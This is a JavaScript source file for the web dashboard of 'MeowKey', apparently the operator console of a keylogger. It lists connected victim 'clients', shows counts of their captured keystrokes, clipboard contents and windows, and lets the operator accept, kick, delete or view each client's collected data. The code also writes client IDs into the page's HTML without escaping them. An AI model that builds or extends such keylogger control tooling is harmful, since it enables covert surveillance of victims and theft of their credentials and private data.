
class MeowKeyApp {
    constructor() {
        this.currentPage = this.getCurrentPage();
        this.selectedClientId = null;
        this.init();
    }

    getCurrentPage() {
        const path = window.location.pathname;
        if (path.includes('index.html') || path === '/') return 'dashboard';
        if (path.includes('waiting_room.html')) return 'waiting_room';
        if (path.includes('clients.html')) return 'clients';
        if (path.includes('settings.html')) return 'settings';
        return 'dashboard';
    }

    init() {
        this.setupPageSpecificFunctions();
        this.setupGlobalEventListeners();
        this.loadPageData();
    }

    setupPageSpecificFunctions() {
        switch (this.currentPage) {
            case 'waiting_room':
                this.setupWaitingRoom();
                break;
            case 'clients':
                this.setupClientsPage();
                break;
            case 'settings':
                this.setupSettingsPage();
                break;
        }
    }

    setupGlobalEventListeners() {
        // Refresh buttons
        document.querySelectorAll('[id*="refresh"], [id*="Refresh"]').forEach(btn => {
            btn.addEventListener('click', () => {
                this.loadPageData();
                window.utils.showNotification('Refreshing data...', 'info');
            });
        });
    }

    async loadPageData() {
        try {
            switch (this.currentPage) {
                case 'waiting_room':
                    await this.loadWaitingRoomData();
                    break;
                case 'clients':
                    await this.loadClientsData();
                    break;
                case 'settings':
                    await this.loadSettingsData();
                    break;
            }
        } catch (error) {
            console.error('Failed to load page data:', error);
            window.utils.showNotification('Failed to load data', 'error');
        }
    }

    // WAITING ROOM PAGE
    setupWaitingRoom() {
        document.addEventListener('click', (e) => {
            const acceptBtn = e.target.closest('.btn-success');
            const rejectBtn = e.target.closest('.btn-danger');
            
            if (acceptBtn && acceptBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = acceptBtn.dataset.clientId;
                this.acceptClient(clientId);
            } else if (rejectBtn && rejectBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = rejectBtn.dataset.clientId;
                this.rejectClient(clientId);
            }
        });
    }

    async loadWaitingRoomData() {
        try {
            const response = await window.utils.apiCall('/api/clients/list');
            if (response.success && response.pending) {
                this.renderPendingClients(response.pending);
                this.updateWaitingRoomStats(response.pending.length);
            } else {
                this.showEmptyState('pending-clients-container', 'No pending clients', 'Client connection requests will appear here');
            }
        } catch (error) {
            console.error('Failed to load waiting room data:', error);
            this.showEmptyState('pending-clients-container', 'No pending clients', 'Client connection requests will appear here');
        }
    }

    renderPendingClients(clients) {
        const container = document.getElementById('pending-clients-container');
        if (!container) return;

        if (!clients || clients.length === 0) {
            this.showEmptyState('pending-clients-container', 'No Pending Clients', 'All client requests have been processed');
            return;
        }

        container.innerHTML = '';
        clients.forEach(client => {
            const pendingClient = document.createElement('div');
            pendingClient.className = 'pending-client';
            pendingClient.innerHTML = `
                <div class="pending-info">
                    <h4>${client.id}</h4>
                    <p>Status: ${client.status}</p>
                </div>
                <div class="pending-actions">
                    <button class="btn-success" data-client-id="${client.id}">
                        <i class="fas fa-check"></i> Accept
                    </button>
                    <button class="btn-danger" data-client-id="${client.id}">
                        <i class="fas fa-times"></i> Reject
                    </button>
                </div>
            `;
            container.appendChild(pendingClient);
        });
    }

    updateWaitingRoomStats(pendingCount) {
        const pendingElement = document.getElementById('pending-count');
        const approvedElement = document.getElementById('approved-today');
        const rejectedElement = document.getElementById('rejected-today');
        
        if (pendingElement) pendingElement.textContent = pendingCount || 0;
        if (approvedElement) approvedElement.textContent = 0; // Would need to track this
        if (rejectedElement) rejectedElement.textContent = 0; // Would need to track this
    }

    async acceptClient(clientId) {
        if (!confirm(`Accept client ${clientId}?`)) return;
        
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/accept`, 'POST');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} accepted`, 'success');
                this.removePendingClient(clientId);
                this.loadWaitingRoomData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to accept client: ${error.message}`, 'error');
        }
    }

    async rejectClient(clientId) {
        if (!confirm(`Reject client ${clientId}?`)) return;
        
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/reject`, 'POST');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} rejected`, 'success');
                this.removePendingClient(clientId);
                this.loadWaitingRoomData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to reject client: ${error.message}`, 'error');
        }
    }

    removePendingClient(clientId) {
        const container = document.getElementById('pending-clients-container');
        if (!container) return;

        const clientElement = container.querySelector(`[data-client-id="${clientId}"]`);
        if (clientElement) {
            clientElement.closest('.pending-client').remove();
        }

        if (container.children.length === 0) {
            this.showEmptyState('pending-clients-container', 'No Pending Clients', 'All client requests have been processed');
        }
    }

    // CLIENTS PAGE
    setupClientsPage() {
        const refreshBtn = document.getElementById('refresh-clients');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', () => {
                this.loadClientsData();
                window.utils.showNotification('Refreshing clients list...', 'info');
            });
        }

        // Event delegation for view buttons
        document.addEventListener('click', (e) => {
            const viewBtn = e.target.closest('.view-client-btn');
            const deleteBtn = e.target.closest('.btn-danger[data-client-id]');
            
            if (viewBtn && viewBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = viewBtn.dataset.clientId;
                this.showClientDetails(clientId);
            } else if (deleteBtn && deleteBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = deleteBtn.dataset.clientId;
                this.deleteClient(clientId);
            }
        });

        // Modal close buttons
        const closeDetailsBtn = document.getElementById('close-details-modal');
        if (closeDetailsBtn) {
            closeDetailsBtn.addEventListener('click', () => {
                window.utils.hideModal('client-details-modal');
            });
        }

        // Client details modal buttons
        const viewDataBtn = document.getElementById('view-client-data');
        const deleteDataBtn = document.getElementById('delete-client-data');
        const kickClientBtn = document.getElementById('kick-client');
        
        if (viewDataBtn) {
            viewDataBtn.addEventListener('click', () => {
                if (this.selectedClientId) {
                    this.viewClientData(this.selectedClientId);
                }
            });
        }
        
        if (deleteDataBtn) {
            deleteDataBtn.addEventListener('click', () => {
                if (this.selectedClientId && confirm(`Delete all data for ${this.selectedClientId}?`)) {
                    this.deleteClient(this.selectedClientId);
                    window.utils.hideModal('client-details-modal');
                }
            });
        }
        
        if (kickClientBtn) {
            kickClientBtn.addEventListener('click', () => {
                if (this.selectedClientId && confirm(`Kick client ${this.selectedClientId}?`)) {
                    this.kickClient(this.selectedClientId);
                    window.utils.hideModal('client-details-modal');
                }
            });
        }
    }

    async loadClientsData() {
        try {
            const response = await window.utils.apiCall('/api/clients/all');
            if (response.success && response.allClients) {
                this.renderClientsTable(response.allClients);
                this.updateClientsStats(response.allClients);
            } else {
                this.showEmptyState('clients-table', 'No Clients Found', 'No clients have registered with the server yet');
            }
        } catch (error) {
            console.error('Failed to load clients data:', error);
            this.showEmptyState('clients-table', 'No Clients Found', 'No clients have registered with the server yet');
        }
    }

    renderClientsTable(clients) {
        const container = document.getElementById('clients-table');
        if (!container) return;

        if (!clients || clients.length === 0) {
            this.showEmptyState('clients-table', 'No Clients Found', 'No clients have registered with the server yet');
            return;
        }

        container.innerHTML = '';
        clients.forEach(client => {
            const row = document.createElement('div');
            row.className = 'pending-client';
            row.innerHTML = `
                <div style="display: grid; grid-template-columns: 2fr 1fr 1fr 1fr 1fr; gap: 1rem; width: 100%; align-items: center;">
                    <span style="font-weight: 500;">${client.id}</span>
                    <span>
                        <span class="connection-dot" 
                              style="display: inline-block; margin-right: 0.5rem; background: #34a853;"></span>
                        Registered
                    </span>
                    <span>${client.sessions || 0}</span>
                    <span>${client.lastSeen ? window.utils.formatTimestamp(client.lastSeen) : 'Never'}</span>
                    <div>
                        <button class="btn-secondary view-client-btn" 
                                data-client-id="${client.id}" 
                                style="padding: 0.25rem 0.5rem; font-size: 0.75rem;">
                            <i class="fas fa-eye"></i> View
                        </button>
                        <button class="btn-danger" 
                                data-client-id="${client.id}"
                                style="padding: 0.25rem 0.5rem; font-size: 0.75rem; margin-left: 0.5rem;">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>
            `;
            container.appendChild(row);
        });
    }

    updateClientsStats(clients) {
        const totalRegistered = document.getElementById('total-registered');
        const activeNow = document.getElementById('active-now');
        const inactiveClients = document.getElementById('inactive-clients');
        
        // Get active clients
        this.getActiveClients().then(activeClients => {
            if (totalRegistered) totalRegistered.textContent = clients.length || 0;
            if (activeNow) activeNow.textContent = activeClients.length || 0;
            if (inactiveClients) inactiveClients.textContent = Math.max(0, clients.length - activeClients.length);
        }).catch(() => {
            if (totalRegistered) totalRegistered.textContent = clients.length || 0;
            if (activeNow) activeNow.textContent = '?';
            if (inactiveClients) inactiveClients.textContent = '?';
        });
    }

    async getActiveClients() {
        try {
            const response = await window.utils.apiCall('/api/clients/list');
            return response.success ? response.active || [] : [];
        } catch (error) {
            return [];
        }
    }

    async showClientDetails(clientId) {
        try {
            this.selectedClientId = clientId;
            
            // Get client details from all clients list
            const response = await window.utils.apiCall('/api/clients/all');
            if (response.success && response.allClients) {
                const client = response.allClients.find(c => c.id === clientId);
                
                if (client) {
                    document.getElementById('client-details-title').textContent = `Client: ${client.id}`;
                    document.getElementById('detail-client-id').textContent = client.id;
                    document.getElementById('detail-client-hash').textContent = '0x' + this.hashString(client.id).toString(16).substring(0, 8);
                    document.getElementById('detail-first-seen').textContent = 'Unknown'; // Would need to track this
                    document.getElementById('detail-last-seen').textContent = client.lastSeen ? window.utils.formatTimestamp(client.lastSeen) : 'Never';
                    document.getElementById('detail-session-count').textContent = client.sessions || 0;
                    document.getElementById('detail-keystrokes').textContent = client.keystrokes || 0;
                    document.getElementById('detail-clipboard').textContent = client.clipboard || 0;
                    document.getElementById('detail-windows').textContent = client.windows || 0;
                    
                    window.utils.showModal('client-details-modal');
                }
            }
        } catch (error) {
            console.error('Failed to load client details:', error);
            window.utils.showNotification('Failed to load client details', 'error');
        }
    }

    async viewClientData(clientId) {
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/data`);
            if (response.success) {
                // Show data in a modal or new page
                window.utils.showNotification(`Viewing data for ${clientId}`, 'info');
                console.log('Client data:', response);
                // You can implement a detailed view modal here
            }
        } catch (error) {
            window.utils.showNotification(`Failed to view client data: ${error.message}`, 'error');
        }
    }

    async kickClient(clientId) {
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/kick`, 'POST');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} kicked`, 'success');
                this.loadClientsData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to kick client: ${error.message}`, 'error');
        }
    }

    async deleteClient(clientId) {
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}`, 'DELETE');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} deleted`, 'success');
                this.loadClientsData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to delete client: ${error.message}`, 'error');
        }
    }

    // SETTINGS PAGE
    setupSettingsPage() {
        const flushBtn = document.getElementById('flush-database');
        if (flushBtn) {
            flushBtn.addEventListener('click', () => {
                this.flushDatabase();
            });
        }

        const stopBtn = document.getElementById('stop-server');
        if (stopBtn) {
            stopBtn.addEventListener('click', () => {
                window.utils.showModal('quit-modal');
            });
        }

        const cancelQuitBtn = document.getElementById('cancel-quit');
        const confirmQuitBtn = document.getElementById('confirm-quit');
        const closeQuitBtn = document.getElementById('close-quit-modal');
        
        if (cancelQuitBtn) {
            cancelQuitBtn.addEventListener('click', () => {
                window.utils.hideModal('quit-modal');
                document.getElementById('admin-password').value = '';
            });
        }
        
        if (confirmQuitBtn) {
            confirmQuitBtn.addEventListener('click', () => {
                this.confirmQuit();
            });
        }
        
        if (closeQuitBtn) {
            closeQuitBtn.addEventListener('click', () => {
                window.utils.hideModal('quit-modal');
                document.getElementById('admin-password').value = '';
            });
        }
    }

    async loadSettingsData() {
        try {
            const response = await window.utils.apiCall('/api/stats');
            if (response.success) {
                this.updateSettingsStats(response);
            }
        } catch (error) {
            console.error('Failed to load settings data:', error);
        }
    }

    updateSettingsStats(stats) {
        // Update all stat elements
        const elements = {
            'uptime': 'uptime',
            'database-size': 'fileSize',
            'total-events': 'totalEvents',
            'db-file-size': 'fileSize',
            'db-used-space': 'usedSpace',
            'db-total-clients': 'totalClients',
            'db-cached-clients': 'cachedClients',
            'db-free-nodes': 'freeNodes',
            'db-free-blocks': 'freeBlocks'
        };
        
        for (const [elementId, statKey] of Object.entries(elements)) {
            const element = document.getElementById(elementId);
            if (element) {
                element.textContent = stats[statKey] || '0';
            }
        }
    }

    async flushDatabase() {
        if (!confirm('Flush database to disk? This will save all pending data.')) return;
        
        try {
            const response = await window.utils.apiCall('/api/database/flush', 'POST');
            if (response.success) {
                window.utils.showNotification('Database flushed successfully', 'success');
            }
        } catch (error) {
            window.utils.showNotification(`Failed to flush database: ${error.message}`, 'error');
        }
    }

    async confirmQuit() {
        const password = document.getElementById('admin-password').value;
        
        if (!password) {
            window.utils.showNotification('Please enter password', 'error');
            return;
        }

        // Note: The quit command would need to be implemented in the API
        window.utils.showNotification('Server stop command sent (not implemented)', 'info');
        window.utils.hideModal('quit-modal');
        document.getElementById('admin-password').value = '';
    }

    // UTILITY METHODS
    hashString(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash);
    }

    showEmptyState(containerId, title, message) {
        const container = document.getElementById(containerId);
        if (!container) return;
        
        container.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-inbox"></i>
                <h3>${title}</h3>
                <p>${message}</p>
            </div>
        `;
    }
}

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
    window.meowKeyApp = new MeowKeyApp();
});


       